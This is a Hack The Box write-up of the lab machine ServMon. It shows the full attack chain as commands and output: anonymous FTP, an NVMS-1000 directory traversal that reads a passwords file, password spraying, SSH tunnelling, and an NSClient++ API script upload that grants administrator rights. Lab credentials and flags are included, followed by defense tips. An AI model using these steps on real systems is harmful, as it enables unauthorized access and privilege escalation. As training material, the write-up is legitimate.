# HTB - ServMon - 10.10.10.184

## HTB - ServMon

### Machine Info

* **Difficulty:** Easy
* **OS:** Windows (Server 2019 Build 17763)
* **IP:** 10.10.10.184
* **Key Skills:** FTP enumeration, directory traversal, password spraying, SSH port forwarding, NSClient++ exploitation

### Overview

ServMon is a Windows machine running multiple services including FTP with anonymous access, SSH, and NSClient++ monitoring software. The attack path involves enumerating FTP to find credential hints, exploiting a directory traversal vulnerability in NVMS-1000 to retrieve passwords, password spraying to gain SSH access, and finally exploiting NSClient++ through SSH port forwarding to achieve privilege escalation. It's a straightforward box that teaches basic Windows enumeration and privilege escalation techniques.

**Key Concepts:**

* Anonymous FTP enumeration
* Directory traversal exploitation
* Password spraying attacks
* SSH local port forwarding
* NSClient++ API exploitation

**Common Ports:**

* **21/TCP** - FTP (Anonymous access enabled)
* **22/TCP** - SSH (OpenSSH for Windows 8.0)
* **80/TCP** - HTTP (NVMS-1000)
* **445/TCP** - SMB
* **8443/TCP** - NSClient++ web interface

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap scan reveals FTP, SSH, HTTP, SMB, NSClient++ ├─ Anonymous FTP access available └─ Discover user notes hinting at credentials
2. **Information Gathering** ├─ Enumerate FTP directories ├─ Read Nadine's note about Nathan's passwords ├─ Read Nathan's todo list mentioning NVMS └─ Identify NVMS-1000 on port 80
3. **Credential Discovery** ├─ Find NVMS-1000 directory traversal vulnerability ├─ Exploit path traversal to read Nathan's Passwords.txt ├─ Extract password list from Desktop └─ Build credential wordlist
4. **Initial Access** ├─ Password spray against SSH and SMB ├─ Find valid credentials: Nadine:L1k3B1gBut7s@W0rk ├─ SSH login as Nadine └─ Capture user flag
5. **Privilege Escalation** ├─ Enumerate NSClient++ installation ├─ Extract NSClient++ password from config ├─ Setup SSH port forward for localhost access ├─ Exploit NSClient++ API to add admin user └─ Gain administrator access

***

### Initial Enumeration

#### Port Scanning

Let's see what's running on this Windows box:

```bash
nmap -p- -Pn -sCV -T5 10.10.10.184 -oN nmap.tcp
```

**Key findings:**

```
21/tcp   open  ftp           Microsoft ftpd (Anonymous login allowed)
22/tcp   open  ssh           OpenSSH for_Windows_8.0
80/tcp   open  http          Redirects to Pages/login.htm
445/tcp  open  microsoft-ds  
8443/tcp open  ssl/https-alt NSClient++
```

**What stands out:**

* **FTP with anonymous access** - Perfect starting point
* **SSH on Windows** - Unusual but useful for stable shell
* **NSClient++** - Known vulnerable monitoring software
* **HTTP redirect** - Some web app to investigate

#### Service Analysis Table

| Port | Service    | Details                  | Attack Vector                       |
| ---- | ---------- | ------------------------ | ----------------------------------- |
| 21   | FTP        | Anonymous access allowed | File enumeration, credential hunt   |
| 22   | SSH        | OpenSSH for Windows 8.0  | Credential stuffing after discovery |
| 80   | HTTP       | NVMS-1000 login          | Directory traversal vulnerability   |
| 445  | SMB        | No anonymous access      | Credential validation               |
| 8443 | NSClient++ | Monitoring web interface | Privilege escalation exploit        |

***

### FTP Enumeration

#### Anonymous Access

FTP allows anonymous login - let's check it out:

```bash
ftp 10.10.10.184
Username: anonymous
Password: [press Enter]
```

**What we found:**

```bash
ftp> ls
02-28-22  07:35PM       <DIR>          Users

ftp> cd Users
ftp> ls
```

**Two user directories:**

* Nadine
* Nathan

#### Nadine's Files

```bash
ftp> cd Nadine
ftp> ls
-rw-r--r-- 1 ftp ftp  174 Feb 28 2022 Confidential.txt

ftp> get Confidential.txt
```

**Content of Confidential.txt:**

```
Nathan,

I left your Passwords.txt file on your Desktop. Please remove this 
once you have edited it yourself and place it back into the secure folder.

Regards
Nadine
```

**Key takeaway:**

* Nathan has a `Passwords.txt` file on his Desktop
* We need to find a way to read it

#### Nathan's Files

```bash
ftp> cd ../Nathan
ftp> ls
-rw-r--r-- 1 ftp ftp  186 Feb 28 2022 Notes to do.txt

ftp> get "Notes to do.txt"
```

**Content of Notes to do.txt:**

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

**Key takeaways:**

* NVMS system exists (port 80)
* NSClient access was "locked down"
* Passwords file exists somewhere

***

### SMB Enumeration

Let's quickly check SMB for anonymous access:

```bash
nxc smb 10.10.10.184 -u guest -p '' --shares
```

**Result:**

```
[-] ServMon\guest: STATUS_LOGON_FAILURE
```

No luck with anonymous/guest access. We'll need credentials.

***

### NVMS-1000 Directory Traversal

#### Finding the Vulnerability

Searching for NVMS-1000 vulnerabilities:

```bash
searchsploit nvms 1000
```

**Found:** Directory Traversal vulnerability (CVE-2019-20085)

* Exploit-DB: 47774
* Allows reading arbitrary files on the system

#### Understanding Directory Traversal

**What is it?** A vulnerability that lets you access files outside the intended directory by using path manipulation (`../../../`).

**Why it matters:** We can read Nathan's `Passwords.txt` from his Desktop without authentication.

#### Exploitation

**Vulnerability location:**

```
http://10.10.10.184/../../../../../../../../../../../../[PATH]
```

**Target file path:** Based on Nadine's note, Nathan's password file is at:

```
C:\Users\Nathan\Desktop\Passwords.txt
```

**Exploit URL:**

```
http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
```

**Using curl:**

```bash
curl "http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
```

**Retrieved passwords:**

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

**Save to file:**

```bash
cat > passwords.txt << EOF
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
EOF
```

***

### Password Spraying

#### What is Password Spraying?

**The concept:** Try a few passwords against many accounts (instead of many passwords against one account). This avoids account lockouts.

**Why we do it:** We have a password list but don't know which user uses which password.

#### Testing Against SMB

```bash
crackmapexec smb 10.10.10.184 -u 'Nadine' -p passwords.txt
```

**Result:**

```
[+] ServMon\Nadine:L1k3B1gBut7s@W0rk
```

**Success!** Nadine's password is `L1k3B1gBut7s@W0rk`

**Testing Nathan:**

```bash
crackmapexec smb 10.10.10.184 -u 'Nathan' -p passwords.txt
```

All failed for Nathan on SMB.

#### Testing Against SSH

**Nadine on SSH:**

```bash
crackmapexec ssh 10.10.10.184 -u 'Nadine' -p passwords.txt
```

**Result:**

```
[+] Nadine:L1k3B1gBut7s@W0rk
```

Same password works for SSH!

***

### Initial Access - SSH as Nadine

#### SSH Login

```bash
ssh Nadine@10.10.10.184
Password: L1k3B1gBut7s@W0rk
```

**We're in!**

```powershell
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

#### User Flag

```powershell
type C:\Users\Nadine\Desktop\user.txt
```

**Flag:**

```
b739e4b866027ec6c4eef88085b94362
```

***

### Privilege Escalation - NSClient++

#### Enumeration

**Check for NSClient++ installation:**

```powershell
cd "C:\Program Files\NSClient++"
dir
```

**Key files found:**

* `nsclient.ini` - Configuration file
* `nscp.exe` - Main executable

#### Extracting NSClient++ Password

**Read configuration:**

```powershell
type nsclient.ini
```

**Or use the CLI tool:**

```powershell
nscp web -- password --display
```

**Password found:**

```
ew2x6SsGTxjRwXOT
```

#### Accessing NSClient++ Web Interface

**Try accessing directly:**

```
https://10.10.10.184:8443
```

**Error received:**

```
403 Forbidden
Access is only allowed from localhost (127.0.0.1)
```

**Why?** The configuration restricts access to localhost only. We need to access it AS IF we're on localhost.

#### SSH Local Port Forwarding

**The solution:** Create an SSH tunnel that forwards our local port 8443 to the target's localhost:8443.

**How it works:**

```
Your Machine:8443 → SSH Tunnel → Target:127.0.0.1:8443
```

**Command:**

```bash
ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443
Password: L1k3B1gBut7s@W0rk
```

**Parameters explained:**

* `-L 8443:127.0.0.1:8443` - Local port forwarding
  * `8443` (left) - Port on our machine
  * `127.0.0.1:8443` (right) - Destination on target

**Now access via browser:**

```
https://127.0.0.1:8443
```

**Login credentials:**

```
Username: admin (default)
Password: ew2x6SsGTxjRwXOT
```

**We're in the NSClient++ interface!**

***

### NSClient++ Exploitation

#### Understanding the Vulnerability

**CVE Details:** NSClient++ allows authenticated users to upload and execute scripts via its API.

**Attack vector:**

1. Upload a malicious batch script
2. Execute it via the API
3. Script runs as SYSTEM

**Reference:**

* Exploit-DB: 46802

#### Creating the Payload

**Simple batch script to add Nadine to Administrators:**

```batch
net localgroup administrators Nadine /add
```

**Create the file:**

```bash
echo "net localgroup administrators Nadine /add" > elevate.bat
```

#### Uploading via API

**Using proxychains for the SSH tunnel:**

If you set up the tunnel with SSH, you can use curl directly. If using proxychains:

```bash
# Upload the script
proxychains4 curl -s -k -u admin \
  -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/elevate.bat \
  --data-binary @elevate.bat
# Enter password: ew2x6SsGTxjRwXOT
```

**Or without proxychains (if using SSH -L):**

```bash
curl -s -k -u admin \
  -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/elevate.bat \
  --data-binary @elevate.bat
# Enter password: ew2x6SsGTxjRwXOT
```

#### Executing the Script

**Trigger execution via API:**

```bash
proxychains4 curl -s -k -u admin \
  "https://localhost:8443/api/v1/queries/elevate/commands/execute?time=20s"
```

**Or:**

```bash
curl -s -k -u admin \
  "https://localhost:8443/api/v1/queries/elevate/commands/execute?time=20s"
```

**What this does:**

* Executes our `elevate.bat` script
* Script runs as SYSTEM (NSClient++ service privilege)
* Adds Nadine to Administrators group
* Takes about 20 seconds to process

#### Verifying Administrator Access

**Wait 20-30 seconds, then reconnect via SSH:**

```bash
ssh Nadine@10.10.10.184
```

**Check group membership:**

```powershell
whoami /groups
```

**Look for:**

```
BUILTIN\Administrators
```

**We're now an admin!**

***

### Root Flag

#### Accessing Administrator Files

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

**Flag:**

```
ca3c6c0d8f1d24d94308bc1506eb0ce3
```

**Both flags captured!**

***

### Quick Reference

#### FTP Enumeration

```bash
# Anonymous login
ftp 10.10.10.184
Username: anonymous
Password: [Enter]

# Navigate and download
ls
cd Users/Nadine
get Confidential.txt
```

#### Directory Traversal

```bash
# Read arbitrary files
curl "http://TARGET/../../../../../../../../../../../../[PATH]"

# Example: Nathan's passwords
curl "http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
```

#### Password Spraying

```bash
# SMB password spray
crackmapexec smb TARGET -u 'username' -p passwords.txt

# SSH password spray
crackmapexec ssh TARGET -u 'username' -p passwords.txt
```

#### SSH Port Forwarding

```bash
# Local port forward
ssh user@TARGET -L LOCAL_PORT:DESTINATION:DESTINATION_PORT

# Example: Access localhost-only service
ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

#### NSClient++ Exploitation

```bash
# Extract password
nscp web -- password --display

# Upload script via API
curl -s -k -u admin \
  -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/SCRIPT.bat \
  --data-binary @SCRIPT.bat

# Execute script
curl -s -k -u admin \
  "https://localhost:8443/api/v1/queries/SCRIPT/commands/execute?time=20s"
```

***

### Troubleshooting

#### FTP Connection Issues

**Problem:** Can't connect to FTP

**Solution:**

```bash
# Try passive mode
ftp -p 10.10.10.184

# Or use lftp
lftp anonymous@10.10.10.184
```

**Why it works:** Passive mode works better with firewalls.

#### Directory Traversal Not Working

**Problem:** Getting 404 or access denied

**Solution:**

* Try different path depths: `../../../` vs `../../../../`
* Ensure proper URL encoding if using special chars
* Test with known files first: `windows/win.ini`

**Example test:**

```bash
curl "http://10.10.10.184/../../../../../../../../../../../../windows/win.ini"
```

#### SSH Port Forward Not Accessible

**Problem:** Can't access https://127.0.0.1:8443

**Solution:**

```bash
# Verify SSH tunnel is active
netstat -an | grep 8443

# Try binding to all interfaces
ssh Nadine@10.10.10.184 -L 0.0.0.0:8443:127.0.0.1:8443

# Check firewall isn't blocking
# On Windows: Check Windows Firewall
# On Linux: Check iptables
```

**Why it works:** SSH tunnel must be active for the forward to work.

#### NSClient++ Script Not Executing

**Problem:** Script uploaded but not running

**Solution:**

* Wait the full 20 seconds before checking
* Verify script was uploaded: Check NSClient++ logs
* Try re-uploading with different name
* Ensure batch syntax is Windows-compatible

**Alternative payload:**

```batch
@echo off
net localgroup administrators Nadine /add > C:\temp\output.txt 2>&1
```

#### Administrator Access Not Working

**Problem:** Added to Admins but can't access files

**Solution:**

```powershell
# You may need to start a new session
# Close SSH and reconnect

# Or use runas
runas /user:Administrator cmd

# Check if UAC is affecting access
# Try from elevated command prompt
```

***

### Key Takeaways

**What we learned:**

1. **Anonymous FTP** - Always check for anonymous access and enumerate thoroughly; notes and documents often contain crucial hints
2. **Directory traversal** - Path manipulation can expose sensitive files; always test for `../` sequences in web apps
3. **Password spraying** - When you have multiple passwords, spray them across known usernames to avoid lockouts
4. **SSH port forwarding** - Localhost-only services can be accessed by tunneling through SSH with `-L` flag
5. **Service exploitation** - Monitoring software like NSClient++ often runs with high privileges and may have APIs that allow code execution
6. **Credential reuse** - Users often reuse passwords across services (SMB, SSH, web apps)

**Defense recommendations:**

* Disable anonymous FTP or restrict access to necessary directories only
* Implement proper path validation to prevent directory traversal
* Enforce strong password policies and prevent password reuse
* Restrict monitoring software interfaces to specific IPs, not just localhost
* Use SSH key authentication instead of passwords
* Run services with least privilege necessary
* Keep software updated (NSClient++ has known vulnerabilities)
* Implement proper input validation in web applications

***

### Related Topics

* \[\[Windows Enumeration]]
* \[\[Directory Traversal Attacks]]
* \[\[Password Spraying]]
* \[\[SSH Tunneling]]
* \[\[Windows Privilege Escalation]]
* \[\[NSClient++ Exploitation]]
